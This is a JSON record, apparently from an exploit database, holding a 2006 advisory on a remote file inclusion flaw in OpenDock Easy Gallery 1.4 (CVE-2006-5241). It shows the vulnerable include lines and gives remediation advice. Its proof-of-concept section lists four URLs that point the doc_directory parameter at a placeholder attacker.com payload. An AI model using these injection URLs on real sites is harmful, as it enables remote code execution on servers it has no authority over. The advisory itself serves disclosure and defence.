{
  "id": "2497",
  "title": "OpenDock Easy Gallery 1.4 - &#039;doc_directory&#039; File Inclusion",
  "cve": "CVE-2006-5241",
  "vuln_type": "rce",
  "code": "ECHO_ADV_52$2006\r\n\r\n-----------------------------------------------------------------------------------------------\r\n[ECHO_ADV_52$2006]OpenDock Easy Gallery <=1.4 (doc_directory) Multiple Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------------\r\n\r\nAuthor          : Dedi Dwianto a.k.a the_day\r\nDate Found      : October, 09th 2006\r\nLocation        : Indonesia, Jakarta\r\nweb             : http://advisories.echo.or.id/adv/adv52-theday-2006.txt\r\nCritical Lvl    : Highly critical\r\nImpact          : System access\r\nWhere           : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication     : OpenDock Easy Gallery\r\nversion         : <=1.4\r\nURL             : http://web.opendock.net\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\nIn folder sw/lib_up_file/ I found vulnerability script file.php\r\n--------------------------file.php---------------------------------------\r\n....\r\n<?\r\n\r\n include $doc_directory.$path_sw.\"lib_up_file/lib_file.php\";\r\n include $doc_directory.$path_sw.\"lib_up_file/lib_form_file.php\";\r\n include $doc_directory.$path_sw.\"lib_up_file/lib_read_file.php\";\r\n include $doc_directory.$path_sw.\"lib_up_file/lib_page_file.php\";\r\n include $doc_directory.$path_sw.\"lib_up_file/find_file.php\";\r\n include $doc_directory.$path_sw.\"lib_up_file/down_stat.php\";\r\n\r\n...\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"$doc_directory\" parameter in file.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\nAlso affected files on Files:\r\n\r\nsw/lib_user/find_user.php\r\nsw/lib_user/lib_user.php\r\nsw/lib_user/lib_form_user.php\r\nsw/lib_user/user.php\r\nsw/lib_session/find_session.php\r\nsw/lib_session/session.php\r\nsw/lib_comment/comment.php\r\nsw/lib_comment/lib_comment.php\r\netc..\r\n\r\n\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~~\r\n\r\nhttp://target.com/[OpenDockEasyGallery_Path]/sw/lib_user/find_user.php?doc_directory=http://attacker.com/inject.txt?\r\nhttp://target.com/[OpenDockEasyGallery_Path]/sw/lib_user/user.php?doc_directory=http://attacker.com/inject.txt?\r\nhttp://target.com/[OpenDockEasyGallery_Path]/sw/lib_comment/comment.php?doc_directory=http://attacker.com/inject.txt?\r\nhttp://target.com/[OpenDockEasyGallery_Path]/sw/lib_session/session.php?doc_directory=http://attacker.com/inject.txt?\r\n\r\nSolution:\r\n~~~~~~\r\n- Sanitize variable $doc_directory on affected files.\r\n- Turn off register_globals\r\n\r\nTimeline:\r\n~~~~~~\r\n09 - 10 - 2006 Bugs Found\r\n09 - 10 - 2006 Vendor Contact\r\n09 - 10 - Public Disclosure\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~\r\n~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous\r\n~ Jessy My Brain\r\n~ az001,boom_3x,mathdule,angelia\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel - #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~~\r\n    EcHo Research & Development Center\r\n    the_day[at]echo[dot]or[dot]id\r\n\r\n# milw0rm.com [2006-10-09]",
  "url": "https://www.exploit-db.com/exploits/2497"
}